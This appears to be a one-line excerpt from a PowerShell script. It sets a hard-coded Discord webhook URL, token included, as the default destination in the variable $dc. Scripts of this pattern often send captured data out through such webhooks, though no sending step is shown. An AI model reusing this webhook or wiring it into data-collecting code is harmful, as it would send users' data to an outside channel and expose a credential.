...
if ($dc.Length -eq 0){$dc = "https://discord.com/api/webhooks/1273082173322432554/lxLrxOwtFUZ4HEwmpwWxq2oFykGUJoQVPPRuxBCRgucLvHWC6fq6f3qEv-FOOexWmCqg"} # Change this to open GUI with your details
